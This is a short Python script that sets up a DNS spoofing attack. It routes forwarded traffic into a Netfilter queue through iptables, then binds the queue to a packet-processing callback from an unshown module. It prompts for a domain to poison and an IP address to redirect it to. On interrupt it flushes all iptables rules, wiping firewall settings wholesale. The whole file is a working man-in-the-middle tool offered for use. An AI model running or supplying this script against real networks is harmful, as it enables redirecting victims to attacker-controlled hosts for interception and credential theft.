import os

from functions import *
from functools import partial
from netfilterqueue import NetfilterQueue

def dns_spoofing(domain, host, output = False):
    """
    Performs the DNS spoofing attack
    
    Step 1: Insert FORWARD rule in iptables
    Step 2: Start Netfilter queue
    Step 3: Bind the queue to our "process" callback
    Step 4: Run the queue
    Step 5: Removing FORWARD rule from iptables
    """

    QUEUE_NUM = 0
    
    # Step 1
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    
    # Step 2
    queue = NetfilterQueue()

    try:
        # Step 3
        queue.bind(QUEUE_NUM, partial(process_packet, domain, host, output))
        
        # Step 4
        queue.run()
    except KeyboardInterrupt:
        # Step 5
        os.system("sudo iptables --flush")

domain = input("Enter the domain to poison: ")
host = input("Enter the ip for the mapping: ")
dns_spoofing(domain, host, True)

